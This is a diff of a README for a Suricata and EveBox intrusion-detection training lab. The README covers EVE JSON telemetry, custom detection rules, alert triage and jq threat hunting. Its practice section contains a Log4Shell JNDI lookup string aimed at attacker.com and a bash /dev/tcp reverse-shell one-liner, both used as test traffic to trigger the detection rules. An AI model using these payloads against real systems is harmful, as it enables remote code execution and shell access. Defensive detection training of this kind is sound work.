@@ -1,6 +1,7 @@
 # Suricata NIDS/NIPS & EveBox SOC Alert Triage Suite
 
 ## Overview
+
 Deploy an enterprise Network Intrusion Detection & Prevention System (NIDS/NIPS) paired with a dedicated Security Operations Center (SOC) triage web console. **Suricata** performs multi-threaded deep packet inspection (DPI), protocol identification, and structured telemetry extraction, outputting rich events in **EVE JSON** format (`eve.json`). **EveBox** ingests, indexes, and presents these security alerts in an analyst-friendly workflow interface supporting alert inbox triage, filtering, escalation, and hex/payload analysis.
 
 - **Default Port / Access**:
@@ -53,11 +54,14 @@ Deploy an enterprise Network Intrusion Detection & Prevention System (NIDS/NIPS)
 ## Modern NIDS vs NIPS & EVE JSON Telemetry
 
 ### NIDS vs NIPS Operation
+
 - **NIDS (Network Intrusion Detection System)**: Operates passively on a mirror or TAP port (or promiscuous interface `eth0`). Alerts on suspicious activity without altering or blocking live packets.
 - **NIPS (Network Intrusion Prevention System)**: Operates inline (e.g., using NFQueue, DPDK, or AF_PACKET inline mode). Packets are inspected in real time and can be rejected (`reject`) or dropped (`drop`) before reaching target endpoints.
 
 ### Suricata EVE JSON Telemetry (`eve.json`)
+
 Unlike legacy IDS log formats that output flat text strings, Suricata generates structured, machine-readable JSON objects for every significant event:
+
 - **`event_type: "alert"`**: Generated when a signature triggers, detailing signature ID (`sid`), category, priority, flow tuples, and payload buffers.
 - **`event_type: "dns"`**: DNS query, transaction ID, record type (`A`, `AAAA`, `TXT`), and responses.
 - **`event_type: "http"`**: Complete HTTP metadata including method, hostname, URL path, user-agent, status codes, and response headers.
@@ -65,6 +69,7 @@ Unlike legacy IDS log formats that output flat text strings, Suricata generates 
 - **`event_type: "flow"`**: High-level connection statistics (start/end timestamp, byte counts, packet counts, TCP state).
 
 Example Alert Event Structure in `eve.json`:
+
 ```json
 {
   "timestamp": "2026-10-14T04:30:15.124567+0000",
@@ -98,11 +103,13 @@ Example Alert Event Structure in `eve.json`:
 ## Custom Suricata Rule Authoring
 
 Suricata rules follow a structured syntax:
+
 ```
 action proto src_ip src_port -> dest_ip dest_port (rule options)
 ```
 
 ### Essential Rule Components:
+
 1. **Action**: `alert` (generate alert), `drop` (block and drop packet), `pass` (ignore traffic), `reject` (send TCP RST or ICMP unreachable).
 2. **Protocol**: `tcp`, `udp`, `icmp`, `ip`, `http`, `dns`, `tls`, `ssh`, `ftp`.
 3. **Direction**: `->` (unidirectional) or `<>` (bidirectional).
@@ -118,6 +125,7 @@ action proto src_ip src_port -> dest_ip dest_port (rule options)
    - `rev`: Revision integer, incremented on rule updates.
 
 ### Pre-loaded Lab Rules (`rules/custom.rules`):
+
 ```suricata
 # 1. SQL Injection Scanner Detection
 alert http any any -> any any (msg:"SOC ALERT - Automated SQL Injection Tool Detected (sqlmap)"; flow:established,to_server; http.user_agent; content:"sqlmap"; nocase; classtype:web-application-attack; sid:1000001; rev:1;)
@@ -137,37 +145,47 @@ alert tcp any any -> any any (msg:"SOC ALERT - Interactive Reverse Shell Payload
 ## How to Solve & Practice
 
 ### 1. Launch the Stack
+
 ```bash
 docker compose up -d
 ```
+
 Access EveBox at `http://localhost:8113` in your browser.
 
 ### 2. Verify Container Telemetry
+
 Check that both Suricata and EveBox are operational:
+
 ```bash
 docker ps --filter "name=cyberlab_"
 ```
 
 ### 3. Generate Simulated Attack Traffic
+
 Trigger the custom rules by sending simulated attack payloads through the network:
 
 #### A. Trigger SQLi Scanner Alert:
+
 ```bash
 docker exec -it cyberlab_suricata curl -s -H "User-Agent: sqlmap/1.7#stable" http://localhost/
 ```
 
 #### B. Trigger Log4Shell Exploit Alert:
+
 ```bash
 docker exec -it cyberlab_suricata curl -s -H "X-Api-Version: \${jndi:ldap://attacker.com/a}" http://localhost/
 ```
 
 #### C. Trigger Reverse Shell Detection:
+
 ```bash
 docker exec -it cyberlab_suricata bash -c "echo '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | nc -l -p 9999 & sleep 1; nc 127.0.0.1 9999"
 ```
 
 ### 4. Offline PCAP Replay & Analysis
+
 Analyze captured traffic from incident response investigations or CTF challenges:
+
 1. Copy or download any `.pcap` file into `./pcaps`:
    ```bash
    # Download a sample malware traffic PCAP
@@ -180,6 +198,7 @@ Analyze captured traffic from incident response investigations or CTF challenges
 3. Refresh EveBox at `http://localhost:8113` to immediately review and triage all alerts generated from the PCAP.
 
 ### 5. SOC Alert Triage in EveBox GUI
+
 1. **Inbox View**: Newly triggered alerts appear grouped by Signature.
 2. **Alert Actions**:
    - **Archive (`e`)**: Mark the alert as triaged/reviewed.
@@ -191,7 +210,9 @@ Analyze captured traffic from incident response investigations or CTF challenges
    - `event_type:alert AND alert.severity:1`
 
 ### 6. Command-Line SOC Threat Hunting with `jq`
+
 Query the raw `eve.json` log on the host:
+
 ```bash
 # Count alerts grouped by signature
 cat logs/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' | sort | uniq -c | sort -nr
@@ -215,7 +236,9 @@ cat logs/eve.json | jq -r 'select(.event_type=="alert" and .http != null) | "\(.
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Check status
 ./lab status
